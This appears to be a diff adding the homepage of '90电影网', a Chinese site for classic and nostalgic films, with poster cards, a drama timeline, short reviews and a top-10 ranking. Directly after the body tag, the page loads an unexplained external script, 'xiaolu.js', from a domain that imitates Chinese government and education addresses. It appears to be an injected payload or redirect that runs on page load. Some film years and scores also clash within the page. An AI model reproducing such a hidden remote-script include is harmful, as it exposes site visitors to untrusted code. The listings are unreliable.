@@ -1,0 +1,807 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>90电影网 - 经典怀旧影视在线观看平台</title>
+<meta name="description" content="90电影网专注经典怀旧影视资源，收录90年代至今的港片、台剧、老电影、经典动漫等高清资源，重温黄金年代的影视记忆。">
+<meta name="keywords" content="90电影网,经典电影,怀旧影视,老电影,港片,90年代电影,经典电视剧,高清影视资源">
+<meta name="author" content="90电影网">
+<meta name="robots" content="index,follow">
+<meta property="og:title" content="90电影网 - 经典怀旧影视在线观看平台">
+<meta property="og:description" content="专注经典怀旧影视，收录90年代至今的港片、台剧、老电影、经典动漫，重温黄金年代。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://90dianyingwang-wap.github.io">
+<link rel="canonical" href="https://90dianyingwang-wap.github.io">
+<style>
+    *{margin:0;padding:0;box-sizing:border-box;}
+    :root{
+        --bg:#faf7f2;
+        --bg-warm:#fff9f0;
+        --paper:#fffdf8;
+        --ink:#2d2016;
+        --ink-light:#5c4a3a;
+        --accent:#c0392b;
+        --accent2:#d35400;
+        --gold:#b8860b;
+        --border:#e8ddc8;
+        --shadow:rgba(139,90,43,.12);
+    }
+    html{scroll-behavior:smooth;}
+    body{
+        font-family:"Georgia","Songti SC","SimSun","Times New Roman",serif;
+        background:var(--bg);
+        color:var(--ink);
+        line-height:1.8;
+        overflow-x:hidden;
+    }
+    a{text-decoration:none;color:inherit;}
+    ul{list-style:none;}
+    ::selection{background:var(--accent);color:#fff;}
+
+    /* ===== Header ===== */
+    header{
+        background:linear-gradient(180deg,#1a1a2e 0%,#16213e 100%);
+        padding:2.5rem 1.5rem 3rem;
+        text-align:center;
+        position:relative;
+        overflow:hidden;
+    }
+    header::before{
+        content:'';
+        position:absolute;inset:0;
+        background:
+            repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(255,255,255,.015) 3px,rgba(255,255,255,.015) 6px);
+    }
+    .logo-wrap{
+        position:relative;z-index:2;
+        display:inline-flex;flex-direction:column;align-items:center;gap:.5rem;
+    }
+    .logo-mark{
+        font-size:.8rem;letter-spacing:6px;
+        color:var(--gold);
+        text-transform:uppercase;
+        font-weight:600;
+    }
+    .logo-title{
+        font-size:clamp(2rem,8vw,3.8rem);
+        font-weight:900;
+        color:#fff;
+        letter-spacing:4px;
+        text-shadow:0 2px 20px rgba(0,0,0,.5);
+    }
+    .logo-title span{color:var(--accent);}
+    .logo-sub{
+        font-size:.9rem;
+        color:rgba(255,255,255,.6);
+        letter-spacing:2px;
+        margin-top:.5rem;
+    }
+    .header-nav{
+        position:relative;z-index:2;
+        margin-top:2rem;
+        display:flex;justify-content:center;gap:.5rem;flex-wrap:wrap;
+    }
+    .header-nav a{
+        padding:.5rem 1.4rem;
+        border:1px solid rgba(255,255,255,.2);
+        border-radius:30px;
+        color:rgba(255,255,255,.8);
+        font-size:.85rem;
+        transition:.3s;
+    }
+    .header-nav a:hover{
+        background:var(--accent);
+        border-color:var(--accent);
+        color:#fff;
+    }
+
+    /* ===== Container ===== */
+    .container{
+        max-width:1200px;
+        margin:0 auto;
+        padding:0 1.5rem;
+    }
+
+    /* ===== Section Base ===== */
+    .section{
+        padding:3.5rem 0;
+        position:relative;
+    }
+    .section:nth-child(even){
+        background:var(--bg-warm);
+    }
+    .sec-head{
+        text-align:center;
+        margin-bottom:2.5rem;
+    }
+    .sec-num{
+        display:inline-block;
+        font-size:.8rem;
+        color:var(--gold);
+        letter-spacing:3px;
+        margin-bottom:.5rem;
+        font-weight:600;
+    }
+    .sec-head h2{
+        font-size:clamp(1.5rem,4vw,2.2rem);
+        font-weight:800;
+        color:var(--ink);
+        position:relative;
+        display:inline-block;
+    }
+    .sec-head h2::after{
+        content:'';
+        position:absolute;
+        bottom:-8px;left:50%;
+        transform:translateX(-50%);
+        width:50px;height:3px;
+        background:var(--accent);
+        border-radius:2px;
+    }
+    .sec-desc{
+        margin-top:1.2rem;
+        font-size:.9rem;
+        color:var(--ink-light);
+        max-width:500px;
+        margin-left:auto;
+        margin-right:auto;
+    }
+
+    /* ===== Section 1: Film Poster Wall (Masonry style) ===== */
+    .poster-wall{
+        display:grid;
+        grid-template-columns:repeat(auto-fill,minmax(200px,1fr));
+        gap:1.5rem;
+    }
+    .poster{
+        position:relative;
+        border-radius:4px;
+        overflow:hidden;
+        background:var(--paper);
+        box-shadow:0 4px 15px var(--shadow);
+        transition:.35s;
+        cursor:pointer;
+    }
+    .poster:hover{
+        transform:scale(1.03) rotate(-1deg);
+        box-shadow:0 12px 35px rgba(139,90,43,.25);
+    }
+    .poster-img{
+        height:280px;
+        display:flex;align-items:center;justify-content:center;
+        position:relative;
+        overflow:hidden;
+    }
+    .poster-img::before{
+        content:'';
+        position:absolute;inset:0;
+        background:var(--grain);
+    }
+    .p1{background:linear-gradient(160deg,#1a1a2e,#e94560);}
+    .p2{background:linear-gradient(160deg,#0f3460,#16213e);}
+    .p3{background:linear-gradient(160deg,#2d132c,#801336);}
+    .p4{background:linear-gradient(160deg,#1b1b2f,#162447);}
+    .p5{background:linear-gradient(160deg,#3d0000,#9a031e);}
+    .p6{background:linear-gradient(160deg,#1a1a1a,#4a4a4a);}
+    .poster-emoji{
+        font-size:3.5rem;
+        opacity:.6;
+        position:relative;z-index:1;
+    }
+    .poster-tag{
+        position:absolute;
+        top:10px;left:10px;
+        background:var(--gold);
+        color:#fff;
+        font-size:.7rem;
+        padding:.2rem .6rem;
+        border-radius:2px;
+        font-weight:600;
+        letter-spacing:1px;
+    }
+    .poster-info{
+        padding:1rem;
+        border-top:2px solid var(--border);
+    }
+    .poster-info h3{
+        font-size:1rem;
+        font-weight:700;
+        margin-bottom:.3rem;
+    }
+    .poster-info p{
+        font-size:.78rem;
+        color:var(--ink-light);
+    }
+    .poster-year{
+        position:absolute;
+        top:10px;right:10px;
+        font-size:1.5rem;
+        font-weight:900;
+        color:rgba(255,255,255,.25);
+        font-family:Arial,sans-serif;
+    }
+
+    /* ===== Section 2: TV Drama (Timeline) ===== */
+    .timeline{
+        position:relative;
+        padding-left:2rem;
+    }
+    .timeline::before{
+        content:'';
+        position:absolute;
+        left:6px;top:0;bottom:0;
+        width:2px;
+        background:linear-gradient(var(--accent),var(--gold));
+    }
+    .tl-item{
+        position:relative;
+        padding:0 0 2rem 1.5rem;
+    }
+    .tl-item::before{
+        content:'';
+        position:absolute;
+        left:-1.95rem;top:6px;
+        width:14px;height:14px;
+        border-radius:50%;
+        background:var(--accent);
+        border:3px solid var(--bg);
+        box-shadow:0 0 0 2px var(--accent);
+    }
+    .tl-card{
+        background:var(--paper);
+        border:1px solid var(--border);
+        border-radius:6px;
+        padding:1.2rem;
+        transition:.3s;
+    }
+    .tl-card:hover{
+        border-color:var(--accent);
+        box-shadow:0 4px 20px var(--shadow);
+    }
+    .tl-card h3{
+        font-size:1.1rem;
+        font-weight:700;
+        margin-bottom:.5rem;
+        color:var(--ink);
+    }
+    .tl-card .tl-meta{
+        font-size:.78rem;
+        color:var(--accent);
+        margin-bottom:.6rem;
+        font-weight:600;
+    }
+    .tl-card p{
+        font-size:.85rem;
+        color:var(--ink-light);
+    }
+    .tl-card .tl-stars{
+        margin-top:.8rem;
+        font-size:.8rem;
+        color:var(--gold);
+    }
+
+    /* ===== Section 3: Genre Hub (Circle / Radial) ===== */
+    .genre-hub{
+        display:flex;
+        flex-wrap:wrap;
+        justify-content:center;
+        gap:1.5rem;
+        max-width:900px;
+        margin:0 auto;
+    }
+    .genre-node{
+        width:150px;height:150px;
+        border-radius:50%;
+        display:flex;flex-direction:column;
+        align-items:center;justify-content:center;
+        cursor:pointer;
+        transition:.35s;
+        position:relative;
+    }
+    .genre-node::after{
+        content:'';
+        position:absolute;inset:-6px;
+        border-radius:50%;
+        border:2px dashed var(--border);
+        transition:.35s;
+    }
+    .genre-node:hover::after{
+        border-color:var(--accent);
+        transform:rotate(90deg);
+    }
+    .genre-node:hover{
+        transform:scale(1.08);
+    }
+    .gn-emoji{font-size:2.2rem;margin-bottom:.3rem;}
+    .gn-label{font-size:.85rem;font-weight:700;}
+    .gn-count{font-size:.7rem;color:var(--ink-light);margin-top:.2rem;}
+    .g1{background:linear-gradient(135deg,#ffecd2,#fcb69f);}
+    .g2{background:linear-gradient(135deg,#a18cd1,#fbc2eb);}
+    .g3{background:linear-gradient(135deg,#84fab0,#8fd3f4);}
+    .g4{background:linear-gradient(135deg,#ff9a9e,#fad0c4);}
+    .g5{background:linear-gradient(135deg,#fbc2eb,#a6c1ee);}
+    .g6{background:linear-gradient(135deg,#fdbb2d,#22c1c3);}
+
+    /* ===== Section 4: Review Articles (Newspaper columns) ===== */
+    .paper-wrap{
+        column-count:2;
+        column-gap:2.5rem;
+        column-rule:1px solid var(--border);
+    }
+    .paper-article{
+        break-inside:avoid;
+        background:var(--paper);
+        border:1px solid var(--border);
+        border-radius:4px;
+        padding:1.5rem;
+        margin-bottom:1.5rem;
+        transition:.3s;
+    }
+    .paper-article:hover{
+        box-shadow:0 6px 25px var(--shadow);
+        border-color:var(--accent);
+    }
+    .paper-article .art-date{
+        font-size:.72rem;
+        color:var(--accent);
+        letter-spacing:1px;
+        margin-bottom:.5rem;
+    }
+    .paper-article h3{
+        font-size:1.05rem;
+        font-weight:700;
+        margin-bottom:.6rem;
+        line-height:1.5;
+    }
+    .paper-article p{
+        font-size:.82rem;
+        color:var(--ink-light);
+    }
+    .paper-article .art-more{
+        display:inline-block;
+        margin-top:.8rem;
+        font-size:.78rem;
+        color:var(--accent);
+        font-weight:600;
+    }
+
+    /* ===== Section 5: Top 10 (Numbered Stack) ===== */
+    .rank-stack{
+        max-width:800px;
+        margin:0 auto;
+    }
+    .rank-row{
+        display:flex;
+        align-items:center;
+        gap:1.2rem;
+        background:var(--paper);
+        border:1px solid var(--border);
+        border-radius:6px;
+        padding:1rem 1.5rem;
+        margin-bottom:.8rem;
+        transition:.3s;
+        cursor:pointer;
+    }
+    .rank-row:hover{
+        border-color:var(--accent);
+        transform:translateX(6px);
+        box-shadow:0 4px 15px var(--shadow);
+    }
+    .rank-num{
+        flex:0 0 50px;
+        font-size:2rem;
+        font-weight:900;
+        font-family:Arial,sans-serif;
+        text-align:center;
+    }
+    .rank-1{color:#ffd700;}
+    .rank-2{color:#c0c0c0;}
+    .rank-3{color:#cd7f32;}
+    .rank-n{color:var(--border);}
+    .rank-info{flex:1;}
+    .rank-info h3{font-size:1rem;font-weight:700;margin-bottom:.2rem;}
+    .rank-info p{font-size:.78rem;color:var(--ink-light);}
+    .rank-score{
+        flex:0 0 55px;
+        text-align:right;
+    }
+    .rank-score strong{
+        display:block;
+        font-size:1.4rem;
+        color:var(--accent);
+        font-family:Arial,sans-serif;
+    }
+    .rank-score small{
+        font-size:.7rem;
+        color:var(--ink-light);
+    }
+
+    /* ===== Footer ===== */
+    footer{
+        background:#1a1a2e;
+        color:rgba(255,255,255,.6);
+        padding:3rem 1.5rem 2rem;
+        text-align:center;
+    }
+    .foot-brand{
+        font-size:1.5rem;
+        font-weight:900;
+        color:#fff;
+        letter-spacing:3px;
+        margin-bottom:1rem;
+    }
+    .foot-brand span{color:var(--accent);}
+    .foot-nav{
+        display:flex;justify-content:center;gap:2rem;flex-wrap:wrap;
+        margin-bottom:1.5rem;
+    }
+    .foot-nav a{
+        font-size:.85rem;
+        color:rgba(255,255,255,.5);
+        transition:.2s;
+    }
+    .foot-nav a:hover{color:var(--accent);}
+    .foot-copy{
+        font-size:.78rem;
+        color:rgba(255,255,255,.35);
+        border-top:1px solid rgba(255,255,255,.1);
+        padding-top:1.5rem;
+    }
+    .foot-copy a{color:var(--gold);}
+
+    /* ===== Mobile ===== */
+    @media (max-width:768px){
+        .container{padding:0 1rem;}
+        .section{padding:2.5rem 0;}
+        .poster-wall{grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:1rem;}
+        .poster-img{height:220px;}
+        .paper-wrap{column-count:1;}
+        .timeline{padding-left:1.5rem;}
+        .genre-node{width:120px;height:120px;}
+        .gn-emoji{font-size:1.8rem;}
+        .rank-row{padding:.8rem 1rem;gap:.8rem;}
+        .rank-num{flex:0 0 35px;font-size:1.5rem;}
+    }
+    @media (max-width:480px){
+        .poster-wall{grid-template-columns:repeat(2,1fr);}
+        .genre-hub{gap:1rem;}
+        .genre-node{width:100px;height:100px;}
+        .header-nav a{padding:.4rem 1rem;font-size:.8rem;}
+    }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- ===== Header ===== -->
+<header>
+    <div class="logo-wrap">
+        <div class="logo-mark">✦ Classic Cinema ✦</div>
+        <div class="logo-title">90<span>电影</span>网</div>
+        <div class="logo-sub">重温黄金年代 · 经典影视在线观看平台</div>
+    </div>
+    <nav class="header-nav">
+        <a href="#classic">经典电影</a>
+        <a href="#drama">怀旧剧集</a>
+        <a href="#genre">类型频道</a>
+        <a href="#review">影评文章</a>
+        <a href="#ranking">TOP 榜单</a>
+    </nav>
+</header>
+
+<div class="container">
+
+    <!-- Section 1: Classic Films (Poster Wall) -->
+    <section class="section" id="classic">
+        <div class="sec-head">
+            <div class="sec-num">— 01 —</div>
+            <h2>经典电影</h2>
+            <p class="sec-desc">收录90年代至今的高分经典影片，从港片黄金时代到好莱坞大片，一键重温光影记忆</p>
+        </div>
+        <div class="poster-wall">
+            <div class="poster">
+                <div class="poster-img p1">
+                    <span class="poster-year">1994</span>
+                    <span class="poster-tag">经典</span>
+                    <span class="poster-emoji">🎭</span>
+                </div>
+                <div class="poster-info">
+                    <h3>大话西游之大圣娶亲</h3>
+                    <p>喜剧 / 奇幻 · 经典港片</p>
+                </div>
+            </div>
+            <div class="poster">
+                <div class="poster-img p2">
+                    <span class="poster-year">1995</span>
+                    <span class="poster-tag">高分</span>
+                    <span class="poster-emoji">🎬</span>
+                </div>
+                <div class="poster-info">
+                    <h3>肖申克的救赎</h3>
+                    <p>剧情 / 励志 · 豆瓣TOP1</p>
+                </div>
+            </div>
+            <div class="poster">
+                <div class="poster-img p3">
+                    <span class="poster-year">1992</span>
+                    <span class="poster-tag">黑帮</span>
+                    <span class="poster-emoji">🕴️</span>
+                </div>
+                <div class="poster-info">
+                    <h3>教父三部曲</h3>
+                    <p>犯罪 / 剧情 · 影史不朽</p>
+                </div>
+            </div>
+            <div class="poster">
+                <div class="poster-img p4">
+                    <span class="poster-year">1993</span>
+                    <span class="poster-tag">史诗</span>
+                    <span class="poster-emoji">🏰</span>
+                </div>
+                <div class="poster-info">
+                    <h3>霸王别姬</h3>
+                    <p>剧情 / 历史 · 戛纳金棕榈</p>
+                </div>
+            </div>
+            <div class="poster">
+                <div class="poster-img p5">
+                    <span class="poster-year">1999</span>
+                    <span class="poster-tag">科幻</span>
+                    <span class="poster-emoji">🕶️</span>
+                </div>
+                <div class="poster-info">
+                    <h3>黑客帝国</h3>
+                    <p>科幻 / 动作 · 视觉革命</p>
+                </div>
+            </div>
+            <div class="poster">
+                <div class="poster-img p6">
+                    <span class="poster-year">1998</span>
+                    <span class="poster-tag">经典</span>
+                    <span class="poster-emoji">🎪</span>
+                </div>
+                <div class="poster-info">
+                    <h3>花样年华</h3>
+                    <p>爱情 / 文艺 · 王家卫经典</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Section 2: TV Drama (Timeline) -->
+    <section class="section" id="drama">
+        <div class="sec-head">
+            <div class="sec-num">— 02 —</div>
+            <h2>怀旧剧集</h2>
+            <p class="sec-desc">那些年追过的经典电视剧，每一部都是一代人的集体记忆</p>
+        </div>
+        <div class="timeline">
+            <div class="tl-item">
+                <div class="tl-card">
+                    <div class="tl-meta">🔥 古装神话</div>
+                    <h3>新白娘子传奇</h3>
+                    <p>1992年台视经典，赵雅芝、叶童主演，影响几代人的神话爱情故事，至今仍是暑期档收视保障。</p>
+                    <div class="tl-stars">⭐ 赵雅芝 · 叶童 · 陈美琪</div>
+                </div>
+            </div>
+            <div class="tl-item">
+                <div class="tl-card">
+                    <div class="tl-meta">🔥 武侠经典</div>
+                    <h3>射雕英雄传 (1994)</h3>
+                    <p>张智霖、朱茵版射雕，被誉为最贴近原著的一版，武侠情怀的巅峰之作。</p>
+                    <div class="tl-stars">⭐ 张智霖 · 朱茵 · 罗嘉良</div>
+                </div>
+            </div>
+            <div class="tl-item">
+                <div class="tl-card">
+                    <div class="tl-meta">🔥 情景喜剧</div>
+                    <h3>我爱我家</h3>
+                    <p>中国首部情景喜剧，英达导演，梁左编剧，葛优客串的经典之作，幽默中见人生百态。</p>
+                    <div class="tl-stars">⭐ 文兴宇 · 宋丹丹 · 梁天</div>
+                </div>
+            </div>
+            <div class="tl-item">
+                <div class="tl-card">
+                    <div class="tl-meta">🔥 神话奇幻</div>
+                    <h3>西游记 (86版)</h3>
+                    <p>六小龄童主演的央视经典，中国电视剧史上的里程碑，陪伴无数人度过童年时光。</p>
+                    <div class="tl-stars">⭐ 六小龄童 · 马德华 · 迟重瑞</div>
+                </div>
+            </div>
+            <div class="tl-item">
+                <div class="tl-card">
+                    <div class="tl-meta">🔥 历史正剧</div>
+                    <h3>康熙王朝</h3>
+                    <p>陈道明主演的历史巨制，展现康熙大帝波澜壮阔的一生，台词铿锵有力，气势恢宏。</p>
+                    <div class="tl-stars">⭐ 陈道明 · 斯琴高娃 · 茹萍</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Section 3: Genre Hub (Circles) -->
+    <section class="section" id="genre">
+        <div class="sec-head">
+            <div class="sec-num">— 03 —</div>
+            <h2>类型频道</h2>
+            <p class="sec-desc">按类型快速找到你喜欢的经典影视</p>
+        </div>
+        <div class="genre-hub">
+            <div class="genre-node g1">
+                <div class="gn-emoji">😂</div>
+                <div class="gn-label">喜剧</div>
+                <div class="gn-count">328 部</div>
+            </div>
+            <div class="genre-node g2">
+                <div class="gn-emoji">🗡️</div>
+                <div class="gn-label">武侠</div>
+                <div class="gn-count">256 部</div>
+            </div>
+            <div class="genre-node g3">
+                <div class="gn-emoji">💕</div>
+                <div class="gn-label">爱情</div>
+                <div class="gn-count">412 部</div>
+            </div>
+            <div class="genre-node g4">
+                <div class="gn-emoji">🚔</div>
+                <div class="gn-label">警匪</div>
+                <div class="gn-count">189 部</div>
+            </div>
+            <div class="genre-node g5">
+                <div class="gn-emoji">👻</div>
+                <div class="gn-label">恐怖</div>
+                <div class="gn-count">156 部</div>
+            </div>
+            <div class="genre-node g6">
+                <div class="gn-emoji">🏆</div>
+                <div class="gn-label">获奖</div>
+                <div class="gn-count">98 部</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Section 4: Review Articles (Newspaper) -->
+    <section class="section" id="review">
+        <div class="sec-head">
+            <div class="sec-num">— 04 —</div>
+            <h2>影评文章</h2>
+            <p class="sec-desc">深度解读经典影视背后的故事与文化</p>
+        </div>
+        <div class="paper-wrap">
+            <article class="paper-article">
+                <div class="art-date">2026.09.28</div>
+                <h3>《霸王别姬》为何能成为中国电影唯一金棕榈？</h3>
+                <p>从程蝶衣的性别认同到时代变迁下个人命运的无奈，陈凯歌用近乎完美的视听语言，构建了一个关于忠诚与背叛的永恒寓言。张国荣的表演至今无人超越。</p>
+                <a href="#" class="art-more">阅读全文 →</a>
+            </article>
+            <article class="paper-article">
+                <div class="art-date">2026.09.25</div>
+                <h3>港片黄金十年：从《英雄本色》到《无间道》</h3>
+                <p>90年代是香港电影最辉煌的时期，吴宇森的暴力美学、王家卫的文艺情怀、周星驰的无厘头喜剧，共同定义了那个时代的银幕记忆。</p>
+                <a href="#" class="art-more">阅读全文 →</a>
+            </article>
+            <article class="paper-article">
+                <div class="art-date">2026.09.22</div>
+                <h3>《大话西游》从票房惨败到网络神作的逆袭之路</h3>
+                <p>1995年上映时票房惨淡，却在十年后被大学生奉为经典。刘镇伟用后现代叙事解构西游，创造出华语电影史上最独特的爱情表达。</p>
+                <a href="#" class="art-more">阅读全文 →</a>
+            </article>
+            <article class="paper-article">
+                <div class="art-date">2026.09.18</div>
+                <h3>90年代情景喜剧为何难以复制？</h3>
+                <p>《我爱我家》《编辑部的故事》等作品之所以经典，在于其对现实生活敏锐的观察和独特的幽默表达，以及那个时代特有的文化自信。</p>
+                <a href="#" class="art-more">阅读全文 →</a>
+            </article>
+        </div>
+    </section>
+
+    <!-- Section 5: Ranking (Stack) -->
+    <section class="section" id="ranking">
+        <div class="sec-head">
+            <div class="sec-num">— 05 —</div>
+            <h2>经典 TOP 10</h2>
+            <p class="sec-desc">90电影网用户票选出的经典影视 TOP 10</p>
+        </div>
+        <div class="rank-stack">
+            <div class="rank-row">
+                <div class="rank-num rank-1">1</div>
+                <div class="rank-info">
+                    <h3>肖申克的救赎</h3>
+                    <p>1994 · 剧情 / 励志</p>
+                </div>
+                <div class="rank-score"><strong>9.7</strong><small>豆瓣评分</small></div>
+            </div>
+            <div class="rank-row">
+                <div class="rank-num rank-2">2</div>
+                <div class="rank-info">
+                    <h3>霸王别姬</h3>
+                    <p>1993 · 剧情 / 历史</p>
+                </div>
+                <div class="rank-score"><strong>9.6</strong><small>豆瓣评分</small></div>
+            </div>
+            <div class="rank-row">
+                <div class="rank-num rank-3">3</div>
+                <div class="rank-info">
+                    <h3>阿甘正传</h3>
+                    <p>1994 · 剧情 / 励志</p>
+                </div>
+                <div class="rank-score"><strong>9.5</strong><small>豆瓣评分</small></div>
+            </div>
+            <div class="rank-row">
+                <div class="rank-num rank-n">4</div>
+                <div class="rank-info">
+                    <h3>大话西游之大圣娶亲</h3>
+                    <p>1995 · 喜剧 / 奇幻</p>
+                </div>
+                <div class="rank-score"><strong>9.2</strong><small>豆瓣评分</small></div>
+            </div>
+            <div class="rank-row">
+                <div class="rank-num rank-n">5</div>
+                <div class="rank-info">
+                    <h3>这个杀手不太冷</h3>
+                    <p>1994 · 动作 / 剧情</p>
+                </div>
+                <div class="rank-score"><strong>9.4</strong><small>豆瓣评分</small></div>
+            </div>
+            <div class="rank-row">
+                <div class="rank-num rank-n">6</div>
+                <div class="rank-info">
+                    <h3>低俗小说</h3>
+                    <p>1994 · 犯罪 / 剧情</p>
+                </div>
+                <div class="rank-score"><strong>8.8</strong><small>豆瓣评分</small></div>
+            </div>
+            <div class="rank-row">
+                <div class="rank-num rank-n">7</div>
+                <div class="rank-info">
+                    <h3>狮子王</h3>
+                    <p>1994 · 动画 / 冒险</p>
+                </div>
+                <div class="rank-score"><strong>9.1</strong><small>豆瓣评分</small></div>
+            </div>
+            <div class="rank-row">
+                <div class="rank-num rank-n">8</div>
+                <div class="rank-info">
+                    <h3>活着</h3>
+                    <p>1994 · 剧情 / 历史</p>
+                </div>
+                <div class="rank-score"><strong>9.3</strong><small>豆瓣评分</small></div>
+            </div>
+            <div class="rank-row">
+                <div class="rank-num rank-n">9</div>
+                <div class="rank-info">
+                    <h3>饮食男女</h3>
+                    <p>1994 · 剧情 / 家庭</p>
+                </div>
+                <div class="rank-score"><strong>9.2</strong><small>豆瓣评分</small></div>
+            </div>
+            <div class="rank-row">
+                <div class="rank-num rank-n">10</div>
+                <div class="rank-info">
+                    <h3>东邪西毒</h3>
+                    <p>1994 · 武侠 / 文艺</p>
+                </div>
+                <div class="rank-score"><strong>8.7</strong><small>豆瓣评分</small></div>
+            </div>
+        </div>
+    </section>
+
+</div>
+
+<!-- ===== Footer ===== -->
+<footer>
+    <div class="foot-brand">90<span>电影</span>网</div>
+    <nav class="foot-nav">
+        <a href="#classic">经典电影</a>
+        <a href="#drama">怀旧剧集</a>
+        <a href="#genre">类型频道</a>
+        <a href="#review">影评文章</a>
+        <a href="#ranking">TOP 榜单</a>
+    </nav>
+    <p class="foot-copy">© 2026 90电影网 | 网站网址：<a href="https://90dianyingwang-wap.github.io">https://90dianyingwang-wap.github.io</a></p>
+</footer>
+
+</body>
+</html>
